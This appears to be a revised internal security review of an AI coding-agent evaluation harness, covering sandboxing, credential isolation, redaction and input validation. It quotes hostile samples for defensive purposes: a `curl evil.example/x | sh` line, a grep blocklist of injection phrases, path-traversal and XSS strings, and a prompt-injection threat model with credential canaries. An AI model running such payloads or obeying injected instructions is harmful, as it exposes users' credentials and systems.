# Security Review — coc-harness-unification Phase 1 (R1-revised)

**Status:** revised after Round 1 redteam (`04-validate/01-redteam-round1-findings.md`). Round 0 cited the cc `--allowed-tools` flag as the credential-isolation mechanism; that flag does not provide path-level deny semantics, so the round-0 HIGH-02 mitigation was mechanically false. This file is the corrected source of truth.

Reviewed against `~/repos/terrene/contrib/csq/.claude/rules/security.md`, `rules/zero-tolerance.md`, `rules/account-terminal-separation.md`. Per zero-tolerance Rule 5: every above-LOW finding gets a fix in this phase.

## CRITICAL

### CRIT-01 — Implementation suite runs `--dangerously-skip-permissions` against adversarial fixtures

**Threat model:** When the harness is unified, suites run from a single dispatch table. csq's existing runner passes `--dangerously-skip-permissions` and the cwd is `COC_ENV` (a subdirectory of the user's repo). If a future safety-suite fixture is dispatched through that same launcher, OR if a model on an implementation test complies with embedded prompt-injection inside a scaffold (SF4-style `notes.md`), the model has unconstrained tool access in a directory adjacent to the user's home. Loom's safety suite explicitly relies on `--permission-mode plan` (cc) / `--sandbox read-only` (codex) / `--approval-mode plan` (gemini) to neuter exactly this class.

**Mitigation (in-phase):**

1. **Per-suite permission table is mandatory and runtime-enforced** (not just convention). Capability/compliance/safety MUST use plan/read-only modes. Only implementation may use `--dangerously-skip-permissions`. Enforcement via INV-PERM-1: at subprocess spawn time, the launcher asserts `(spec.suite, spec.cli) → spec.permission_mode` matches the per-suite × per-CLI launcher table; mismatch is a hard panic, not a warning. See `04-nfr-and-invariants.md` INV-PERM-1.
2. **Process-level sandbox for implementation suite.** Linux: `bwrap --ro-bind / / --tmpfs /home/$USER/.claude --tmpfs /home/$USER/.ssh --tmpfs /home/$USER/.codex --tmpfs /home/$USER/.gemini --tmpfs /home/$USER/.aws --tmpfs /home/$USER/.gnupg <cmd>`. macOS: `sandbox-exec` profile denying read on `~/.claude`, `~/.ssh`, `~/.codex`, `~/.gemini`, `~/.aws`, `~/.gnupg`. The credential symlink lives inside the test fixture's stub-HOME and is the ONLY credential-shaped file the process can see.
3. **Scaffold injection grep guard.** CI grep that fails the harness build if any file under `coc-eval/scaffolds/` contains `ignore prior instructions`, `SYSTEM:`, `admin mode`, `BEGIN PRIVATE KEY`, etc.
4. **`coc-eval/lib/launcher.py` enforces permission_mode at the call site:** the implementation runner is the only path that flips `--dangerously-skip-permissions`, and it asserts `spec.suite == "implementation"` before doing so. Per R1-MED-01.

**Sandbox tooling deprecation note:** macOS `sandbox-exec` is deprecated by Apple as of 10.10 but still works. Long-term replacement (macOS `sandbox` framework via Rust shim) is a v1.1 follow-up. Phase 1 ships with `sandbox-exec` as a documented deprecation risk per ADR-F.

**Blocks ship:** YES.

### CRIT-02 — Profile-name path traversal AND content-validation pairing

**File:line:** `coc-eval/runner.py:273` — `overlay_path = HOME / f".claude/settings-{profile}.json"`. `profile` is `args.profile`, unvalidated CLI string.

**Threat model (name traversal):** Crafted profile name `../../etc/passwd-fragment` → arbitrary file read. Same pattern via `out_name = f"eval-{args.profile}-{args.mode}"` at line 854 → arbitrary write target.

**Threat model (content):** Profile-name validation prevents traversal. It does NOT validate file CONTENTS. A developer running an earlier malicious script may have a crafted `~/.claude/settings-aaaa.json` already on disk with dangerous keys (`mcpServers`, `hooks`, `statusLine.command`, `env.LD_PRELOAD`). Profile name `aaaa` passes name validation; merge happens; arbitrary code runs at every cc launch.

**Mitigation (in-phase, paired with HIGH-06):**

1. Validate profile name at argparse against `^[a-zA-Z0-9_-]+$`, max 64 chars. Centralize validator in `coc-eval/lib/validators.py`. Apply to fixture, suite, CLI, profile names.
2. Profile-content positive allowlist (HIGH-06). MUST land together with name validator; landing only one leaves a partial defense.
3. File-permission guard on profile overlay: harness asserts `~/.claude/settings-{profile}.json` is owned by the same uid as the harness process AND has perms `0o600`. Else refuse to load.

**Blocks ship:** YES.

### CRIT-03 — Suite glob discovery is an arbitrary-code-execution sink

**File:line:** `coc-eval/runner.py:60-69` (existing pattern); proposed extension to `suites/*.py` per implementation plan H5.

**Threat model:** A developer (or attacker via a malicious dependency-update PR, single-file PR, or pre-commit hook that drops a file) places `coc-eval/suites/_aaa_pwn.py` containing `import os; os.system("curl evil.example/x | sh")` at module top-level. Glob-import executes it at harness invocation, before any test starts, including a single-test `--test CM3` run. CRIT-02 covers profile-name traversal; this finding covers a broader ACE class.

**Mitigation (in-phase, lands in H1 before glob discovery in H5):**

1. `coc-eval/lib/validators.py` defines `SUITE_MANIFEST = ["capability", "compliance", "safety", "implementation"]`. Suite loader iterates the manifest, NOT a glob. Same pattern for `tests/eval_*.py` — explicit per-suite test manifests.
2. Static check: `grep -rn 'glob.*suites\|glob.*tests' coc-eval/lib/` empty (AC-32-bis).
3. Implementation plan H1 + H5 updated: "suite discovery via SUITE_MANIFEST list + import" not "via glob + import."

**Blocks ship:** YES.

## HIGH

### HIGH-01 — Adversarial-fixture egress to vendor logs

**Source:** `~/repos/loom/.claude/test-harness/fixtures/safety/CLAUDE.md` rules + SF1–SF4 prompts. Sent verbatim to Anthropic/OpenAI/Google. Vendor TOS retain prompts for abuse review (Anthropic ≤30 days; OpenAI 30 days; Google similar).

**Threat model:** Vendor employee or breach reads adversarial prompts and fixture markers. Strings themselves are public attack patterns — fine. Risks:

- Future fixture adding operator-specific paths becomes reconnaissance signal.
- Combined with CRIT-01, a model that ACTUALLY reads `~/.ssh/id_rsa` in a bad-day scenario lands the secret in vendor logs AND `coc-eval/results/`.

**Mitigation (in-phase):**

1. `coc-eval/SECURITY.md` (new file): "Adversarial fixtures are public-domain attack patterns — do not extend safety fixtures with operator-specific paths, custom env vars, or anything that reveals the test machine's configuration."
2. Pair with CRIT-01 (sandbox modes).
3. Redaction pass before JSONL persistence (HIGH-04).

**Blocks ship:** YES.

### HIGH-02 — Stub-HOME does not isolate model tool access

**Round-0 framing was wrong.** The stub-HOME design (ADR-F) overrides `CLAUDE_CONFIG_DIR=stub_home`, isolating CC's LOADER. The model's tool calls do NOT respect `CLAUDE_CONFIG_DIR` — they resolve absolute paths against the OS, not against CC's config root. `~/.claude/.credentials.json` resolves via `$HOME`, which is NOT set to stub_home in round-0's design. Stub-HOME is loader isolation, NOT tool-access isolation.

**Threat model:** A model under `--dangerously-skip-permissions` (implementation suite) complying with an indirect-injection prompt has direct read access to:

- `~/.claude/.credentials.json` (real OAuth tokens for every csq-managed account)
- `~/.claude/accounts/config-N/.credentials.json` (per-account refresh tokens)
- `~/.codex/auth.json`, `~/.gemini/oauth_creds.json`
- `~/.ssh/`, `~/.aws/`, `~/.gnupg/`

cc's `--allowed-tools` flag is a positive allowlist of tool NAMES + bash command prefixes; it has no path-level deny semantics. The round-0 mitigation citing `--allowed-tools` for path restrictions was mechanically false. With `--dangerously-skip-permissions`, the entire permission system is bypassed by definition.

**Mitigation (in-phase, layered):**

1. **`$HOME` override for capability/compliance/safety.** Launcher sets BOTH `CLAUDE_CONFIG_DIR=stub_home` AND `HOME=stub_home_root` where `stub_home_root` is a fake `$HOME` whose `~/.claude/` IS the stub-HOME (already populated with credential symlink) and whose `~/.ssh/`, `~/.aws/`, `~/.codex/`, `~/.gemini/`, `~/.gnupg/` are absent or empty placeholder dirs. Updates `05-launcher-table-contract.md`.
2. **Process-level sandbox for implementation suite** (CRIT-01 mitigation #2). The credential symlink lives inside the test fixture's stub-HOME and is the ONLY credential-shaped file the process can see.
3. **Ongoing credential-read audit during implementation suite** (HIGH-07): Python `sys.addaudithook` records every `open()` syscall on credential-shaped paths; matches abort the test with CRIT marker.
4. **Pre-spawn symlink revalidation** (R1-HIGH-09): launcher MUST re-read symlink target and assert `os.stat(target).st_ino == expected_ino` immediately before subprocess spawn. INV-ISO-6.
5. **Negative-control credential canary** (HIGH-07 / AC-23a): synthetic credential file at stub-HOME with fake-shaped token (`sk-ant-oat01-CANARY_DO_NOT_USE_AAAAAAAAAAAAAAAAAAAA`). Fixture prompt asks model to dump `.credentials.json`. If response contains `CANARY_DO_NOT_USE`, harness emits CRIT marker. Deterministic, CI-safe, no real-credential exposure.

**Blocks ship:** YES.

### HIGH-03 — Cross-suite privilege escalation residue

**Threat model:** Implementation suite runs `--dangerously-skip-permissions` in `coc-env/`. Residue paths:

1. `git clean -fd` scoped to coc-env via cwd, but a model that `cd`'d via tool call to a parent and wrote there is not cleaned.
2. `tempfile.mkdtemp` directories never cleaned up. After full run, `/tmp/csq-eval-coc-*/` accumulate, each with symlinked `.credentials.json` pointing at live OAuth.
3. `.git/hooks/` left behind from a model that wrote a pre-commit hook under `--dangerously-skip-permissions` (R1-MED-04). Persistent code-execution hook.
4. `core.hooksPath` config can redirect git hooks to `/tmp/evil-hooks/` (R1-MED-04).

**Mitigation (in-phase):**

1. `git clean -fdx && git -C coc-env reset --hard HEAD && rm -rf coc-env/.git/hooks/* && git -C coc-env config --unset core.hooksPath` before EACH test.
2. Suite-ordering rule: compliance + safety run BEFORE implementation in any combined invocation. Hard ordering check in code (INV-RUN-8; note INV-RUN-7 is the separate token-budget circuit breaker, NOT ordering).
3. `cleanup_eval_tempdirs()` finalizer removes every `/tmp/csq-eval-*` older than current run, called from suite entry point. mkdtemp directories with credential symlinks MUST NOT survive process exit.
4. Refuse to start if `coc-env/` has untracked files outside the scaffold whitelist, regardless of which suite is requested.
5. **Process-group kill on timeout** (R1-HIGH-06): launcher uses `subprocess.Popen(..., start_new_session=True)`; on timeout, sends SIGTERM to process group via `os.killpg(os.getpgid(p.pid), signal.SIGTERM)`, waits 5s, then SIGKILL the process group. Python `subprocess.run` does NOT do this. Updates INV-RUN-3.
6. **`O_CLOEXEC` on credential symlink fd** (R1-HIGH-06): `fcntl.fcntl(fd, fcntl.FD_CLOEXEC)` before exec, OR don't open the symlink at the harness level — let cc resolve it itself. File descriptors inherited by spawned subprocesses are a credential-leak channel.

**Blocks ship:** YES.

### HIGH-04 — JSONL captures vendor stderr without `redact_tokens` pass

**Source:** Loom and csq pipelines persist raw upstream output without redaction.

**Threat model:** csq has `csq-core/src/error.rs:161 redact_tokens` precisely because Anthropic's `invalid_grant` response has been observed echoing refresh token prefixes (journals 0007, 0010). A 4xx from claude-code's auth refresh during a harness run, captured into JSONL, contains a refresh token. JSONL is gitignored but: operator copy-pastes snippets into bug reports; `/tmp/coc-harness-*` on shared CI runners; backup tooling following symlinks; future diff between runs printed to console.

**Mitigation (in-phase):**

1. Port `csq-core/src/error.rs:161 redact_tokens` to Python as `coc-eval/lib/redact.py`. Cover same patterns: `sk-ant-oat01-`, `sk-ant-ort01-`, `sk-* + 20`, `sess-* + 20`, `rt_* + 20`, `AIza* + 30`, 32+ hex run, 3-segment JWT, PEM blocks.
2. **DO NOT add JSON-field-name-based redaction** (R1-HIGH-01). The redactor is byte-pattern-based, not field-name-based. Round-0 cited "redact OAuth `error_description`" — that was wrong. The redactor catches token-shaped bytes wherever they appear.
3. **Word-boundary parity with Rust** (R1-HIGH-01): Rust's `redact_tokens` uses a custom char-class word boundary (`is_key_char` includes `-` and `_`). Python's naive `\b` regex matches on `-`/`_` boundaries differently. Use lookahead/lookbehind: `(?<![A-Za-z0-9_-])sk-[A-Za-z0-9_-]{20,}(?![A-Za-z0-9_-])`. Mandatory parity test: `redact_tokens("module_sk-1234567890123456789012345")` returns input unchanged (matches Rust at `error.rs:200`).
4. Apply redaction to BOTH stdout and stderr before JSONL emit and per-test `.log` write.
5. Unit test against same fixtures as Rust (`error.rs:686-1013`). All 25 fixtures, byte-for-byte parity. AC-20a.
6. Negative-control: write a result with `sk-ant-oat01-AAAA...` in stderr, persist, grep for `sk-ant-oat01-`. Must be zero matches. AC-20.

**Blocks ship:** YES.

### HIGH-05 — Symlinked `.credentials.json` Windows TOCTOU + macOS file-descriptor inheritance

**File:line:** `runner.py:317-331` `_symlink_credentials` symlinks user's real OAuth credentials into `tempfile.mkdtemp(prefix="csq-eval-...")`.

**Threat model on POSIX:** mkdtemp 0700; safe single-user. But: a CI runner with multiple PRs in flight on the same physical machine OR a developer running the harness while another tool watches `/tmp` opens a TOCTOU window between symlink creation and CLI process start. Attacker who can predict the mkdtemp path (PID + counter — see R1-HIGH-04) and write to the symlink target between create and spawn can swap target.

**Threat model on Windows:** Python `tempfile.mkdtemp` uses `GetTempPath()`. ACLs default user-only on modern Windows but symlink semantics differ — Windows symlinks require `SeCreateSymbolicLinkPrivilege` OR Developer Mode. If symlink falls back to copy, copy of `.credentials.json` lands in `%TEMP%` not auto-purged; AV scanning recursively can upload to vendor cloud.

**Mitigation (in-phase):**

1. **POSIX:** pre-spawn symlink revalidation (INV-ISO-6) — `os.readlink` returns canonical real-creds path; `os.path.realpath()` resolves to expected inode. If anything changed, abort. One syscall before spawn.
2. **Windows:** do NOT symlink credentials. Set `CLAUDE_CONFIG_DIR=<real ~/.claude>` for the test process and let the CLI read in place. Same model loom uses for non-implementation suites.
3. **Tempdir cleanup after each test** (HIGH-03 #3): `try/finally shutil.rmtree(config_dir)` per test.
4. csq-eval is not designed for shared CI runners. If shared CI is a use case, add v1.1 milestone for sealed-tmpfs credential isolation. Document explicitly.
5. **`O_CLOEXEC`** on credential fd (HIGH-03 #6) prevents fd inheritance leak.

**Blocks ship:** YES on Windows. Phase 1 may gate Windows out at argparse if scope dictates.

### HIGH-06 — Settings overlay positive allowlist (not strip-list)

**Round-0 was wrong.** The strip-list approach (`systemPromptFile`, `appendSystemPromptFile`, `apiKeyHelper`) covers obvious file-reference cases but misses the entire code-execution surface in CC's settings schema:

- `mcpServers.<name>.command = ["sh", "-c", "..."]` — arbitrary command via MCP.
- `hooks.PreToolUse.<*>.command` — shell commands run before/after every tool invocation.
- `permissions.deny` and `permissions.allow` patterns can be subverted via merge logic.
- `statusLine.command` — shell command run on every status line refresh.
- `env.LD_PRELOAD` (Linux) / `env.DYLD_INSERT_LIBRARIES` (macOS) — process injection.

A profile-overlay attacker controlling `~/.claude/settings-{profile}.json` (or BASE settings, exploiting CRIT-02 path-traversal) plants any of these and the strip-list misses them.

**Mitigation (in-phase):**

1. **Replace strip-list with positive allowlist.** Merged settings post-overlay MUST contain only keys in `SETTINGS_ALLOW = {"env", "model", "permissions"}`. All other keys deleted recursively.
2. **`env` filtered to a sub-allowlist:** only `ANTHROPIC_*` keys plus a small hardcoded harness allowlist. Reject `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `PATH`, etc.
3. **`permissions` validated** to contain only `{allow, deny, defaultMode}` keys with simple-string-pattern values, not file refs.
4. The merge runs on the harness side, not by relying on cc's own validation. cc may accept arbitrary keys it doesn't know about (forward-compat) — we MUST drop them ourselves.
5. AC-22 update: "ONLY `env`, `model`, `permissions` keys survive merge. `mcpServers`, `hooks`, `statusLine`, `systemPromptFile`, `appendSystemPromptFile`, `apiKeyHelper`, and any unknown key are stripped. `env` filtered to `ANTHROPIC_*` and harness allowlist."

**Blocks ship:** YES.

### HIGH-07 — Implementation suite needs ongoing credential-read monitoring

**Source:** AC-23 round-0 was a one-shot canary. The implementation suite has 5 EVAL-\* tests under `--dangerously-skip-permissions` in `coc-env/`. None have monitoring for incidental credential reads during legitimate task execution. EVAL-A004 (hook security audit) and EVAL-P010 (auth.py refactor) are tasks where the model could plausibly read credential-shaped files in pursuit of legitimate work.

**Mitigation (in-phase, layered — note hook scope vs sandbox scope):**

1. **Process-level sandbox is the PRIMARY defense** (CRIT-01 mitigation #2). `bwrap` (Linux) / `sandbox-exec` (macOS) confines the spawned cc/codex/gemini child process so the credential-shaped paths (`~/.claude`, `~/.ssh`, etc.) are physically unreachable to the model's tool calls. THIS is what defends the documented threat (model-driven credential read in subprocess).
2. **Python audit hook** (`sys.addaudithook`) in `coc-eval/lib/credential_audit.py` is a SECONDARY defense-in-depth tripwire. Critical caveat: `sys.addaudithook` fires on `open()` events INSIDE the harness Python process ONLY — it does NOT see syscalls in spawned subprocess children. The audit hook is therefore NOT a substitute for the sandbox; it catches a different (much smaller) class — accidental credential reads from harness-internal Python code (e.g., a future bug in `runner.py` opening `.credentials.json` for a copy operation). Document this scope distinction in the spec to prevent operators trusting a defense that isn't there.
3. **Synthetic credential canary** lands in H7 alongside the sandbox (moved up from H8 per R2-HIGH-02): canary credential file with `CANARY_DO_NOT_USE` marker placed at the sandbox-protected path; fixture prompt asks model to dump it. If the model's response contains `CANARY_DO_NOT_USE`, the sandbox failed and the harness emits CRIT. This exercises the sandbox profile pre-merge; H7 cannot ship a broken sandbox profile because the canary fixture is part of the H7 gate.

**Blocks ship:** YES.

### HIGH-08 — Aggregator markdown injection via test/fixture names

**Threat model:** A model output, fixture name, or test name containing markdown injection (`<script>`, `[click](javascript:...)`, pipe-chars `|` breaking table cells) flows from JSONL through `aggregate.py` into `results/<run_id>/SUMMARY.md`. CI flow uploads as GitHub artifact; file rendered in GitHub PR UI (hardened) or local markdown editors (less hardened).

**Mitigation (in-phase):**

1. Every string field consumed by `aggregate.py` MUST be escaped before Markdown emission: `|` → `\|`, `<` → `&lt;`, `>` → `&gt;`, backticks wrapped not interpreted, newlines stripped.
2. Drop `cmd` field from JSONL (R1-LOW-01); replace with `cmd_template_id` — prompt content already in `prompt_sha256`/log file; doesn't need to appear twice.
3. Unit test in H9: aggregate input with `test = "<script>alert(1)</script>"` produces escaped output. AC-8a injection canary.

**Blocks ship:** YES.

### HIGH-09 — Aggregator JSON-bomb DoS surface

**Threat model:** `aggregate.py` reads `results/**/*.jsonl`. No write-side authentication — anyone with FS access can drop a crafted JSONL. `json.loads('{"x": ' + '9' * 10_000_000 + '}')` is parseable, returns an int with ~10MB memory. 100 such records = 1GB RAM. `json.loads('[' * 10000 + ']' * 10000)` triggers RecursionError at default `sys.getrecursionlimit() = 1000`.

**Mitigation (in-phase):**

1. Per-file size cap (`statinfo.st_size > 10_000_000` → skip with warning).
2. Per-record byte cap (10KB after read, 100KB hard).
3. `json.JSONDecoder.raw_decode` with byte-budget per file.
4. Bounded int parsing via `parse_int=lambda s: int(s) if len(s) < 20 else 0`.
5. Explicit `try/except RecursionError, MemoryError, OverflowError`.
6. AC-8b: aggregate.py rejects (with warning, not crash) JSONL line longer than 100KB or integer with >20 digits.

**Blocks ship:** YES.

### HIGH-10 — Auth probe one-shot vs mid-run token expiry (AD-02)

**Threat model:** Full Phase-1 run is up to 90min (revised AC-24). cc OAuth access tokens expire on ~1h boundary; gemini OAuth even shorter. With single probe at t=0 and 49 cells, an access-token expiry mid-run produces `error_invocation` (not `skipped_cli_auth`) for every subsequent test in that CLI — closed taxonomy maps that to "counts as fail; flagged." Harness reports a real fail count that is in fact an auth artifact.

**Mitigation (in-phase):**

1. Re-probe auth between suites (4 suites × 3 CLIs = 12 probes total, ≤2s each — negligible vs 90min). INV-AUTH-3.
2. Reclassification: any stderr matching `401|invalid_grant|expired_token|token_expired|reauth` re-runs the probe; if probe now fails, test gets `skipped_cli_auth`, JSONL records `auth_state_changed: true`.
3. Replace mtime heuristic in FR-6 auth probe with real `claude --print "ping"` probe with 10s timeout. mtime check is too weak — a 30-day-stale credential that passes probe but fails on first request floods red.

**Blocks ship:** YES.

## MEDIUM

### MED-01 — Suite-ordering enforcement is convention, not invariant (R1-MED-01)

Round-0 mitigation #2 of HIGH-03 said "Suite-ordering rule: compliance and safety run BEFORE implementation." Enforcement at suite-list-time is convention. A future PR adds suite #5 after implementation; a developer reorders the dispatch table; a `--skip-suite` flag trick reorders.

**Mitigation:** Runtime invariant INV-PERM-1 (`04-nfr-and-invariants.md`): at subprocess spawn time, launcher asserts `(spec.suite, spec.cli) → spec.permission_mode` matches the table. Mismatch is hard panic. Bypass requires editing two files in same PR — higher tripwire than reordering one list.

### MED-02 — `cliVersion` shellout 5s timeout fail-closed; mtime auth probe too weak

**Mitigation:** Real `claude --print "ping"` probe with 10s timeout for auth (HIGH-10). For `cliVersion` failure: harness records `"unknown"` AND a separate `cli_version_probe_failed: true` flag. Skipping the version field silently turns into a forensic gap.

### MED-03 — Token-budget circuit breaker missing (R1-MED-03)

A misconfigured retry path can cascade. Each Opus call non-trivial spend; 100 retries × $0.05 = $5 per stuck run; CI matrix × 12 = $60.

**Mitigation:** INV-RUN-7: harness tracks total `input_tokens + output_tokens` across all tests. Default cap: 5,000,000 input / 1,000,000 output. Breach aborts with state `error_token_budget`. Override via `--token-budget-input N --token-budget-output N`. AC-24a.

### MED-04 — `git clean -fdx` doesn't clean `.git/hooks/` or `core.hooksPath` (R1-MED-04)

A model writing `.git/hooks/pre-commit` under `--dangerously-skip-permissions` leaves a persistent code-execution hook. `core.hooksPath` config can redirect to `/tmp/evil-hooks/` instead of writing to `.git/hooks/`.

**Mitigation:** Folded into HIGH-03 #1: `git clean -fdx && git -C coc-env reset --hard HEAD && rm -rf coc-env/.git/hooks/* && git -C coc-env config --unset core.hooksPath`. Post-test scan: `find coc-env/.git/hooks -type f -executable` non-empty aborts.

### MED-05 — `prepareFixture` Python equivalent must enforce same name regex

Centralize in `coc-eval/lib/validators.py`; require fixture/suite/CLI/profile names pass it. Covered if CRIT-02 fix is generalized.

### MED-06 — `coc-eval/results/` gitignore startup assertion

Already gitignored at `csq/.gitignore:61`. Add startup assertion: `git check-ignore coc-eval/results/` and refuse to write results if path not ignored. Defensive belt-and-suspenders.

### MED-07 — Subprocess argv injection guardrail

Loom + csq are safe currently. Centralize ALL subprocess invocations in `coc-eval/lib/launcher.py`. Suite files MUST NOT call `subprocess` directly. Static check (CI): grep `coc-eval/suites/*.py` for `subprocess`, `os.system`, `shell=True` outside the launcher.

### MED-08 — Gemini plan-mode equivalence to safety-test pass

Document in spec: gemini safety-suite results are plan-mode behavioral assertions, NOT execution-mode. cc and codex are the two whose safety scores transfer to non-plan execution.

## LOW

### LOW-01 — Busy-wait quota retry blocks process

Python port uses `time.sleep`. One line.

### LOW-02 — `cliVersion` shells out without timeout

5s timeout to version probe. Combined with MED-02.

### LOW-03 — JSONL `cmd` field redundancy + injection vector (R1-LOW-01)

Drop `cmd` from per-test record. Replace with `cmd_template_id` referencing launcher table. Cleaner schema, smaller injection surface. Folded into HIGH-08.

### LOW-04 — Schema versioning example shows both at 1.0.0

Add comment in schema doc: "These two values are independent; matching values are coincidence."

## Passed checks

- Loom uses argv-spawn throughout. No `shell=True`, no string concat into shells.
- csq runner uses `subprocess.run([list], ...)` exclusively.
- Fixture-name regex exists and enforced in loom (`harness.mjs:262`).
- `coc-eval/` gitignored at `csq/.gitignore:61`.
- mkdtemp 0700 on POSIX (safe single-user).
- csq's `error::redact_tokens` well-tested. Port it; don't reinvent.
- Account-terminal-separation invariants not violated by harness — harness symlinks credentials, daemon refreshes.
- `extract_oauth_error_type` returns `&'static str` from constant array (`error.rs:55-62`) — sound design pattern; Python port should mirror via `OAUTH_ERROR_TYPES: tuple[str, ...]` and return allowlist constant, not parsed string.

## Summary

**Blocks ship (10 findings):** CRIT-01, CRIT-02, CRIT-03, HIGH-01, HIGH-02, HIGH-03, HIGH-04, HIGH-05, HIGH-06, HIGH-07, HIGH-08, HIGH-09, HIGH-10.

**In-phase fixes (per zero-tolerance Rule 5):** all CRIT/HIGH plus MED-01..08.

**Total in-phase work:** ~2 autonomous sessions at the 10x multiplier — small focused fixes, port of Rust `redact_tokens` to Python, sandbox-exec/bwrap integration, audit hook, positive allowlist post-merge filter, INV-PERM-1 runtime check.

**Specs to update:** new spec `specs/08-coc-eval-harness.md` defining suites, launcher table per suite × per CLI, permission-mode contract, redaction pipeline, settings-key allowlist, fixture-name validator, tempdir cleanup invariant, Windows credential rule, sandbox-exec/bwrap integration.

## Round-1 redteam reference

Findings consolidated in `04-validate/01-redteam-round1-findings.md`. This file incorporates: R1-CRIT-01/02/03; R1-HIGH-01/02/03/04/05/06/07/08/09; R1-MED-01/02/03/04; R1-LOW-01/02. Round-0 findings preserved where still valid; corrected where redteam falsified the mitigation (HIGH-02 most notably).
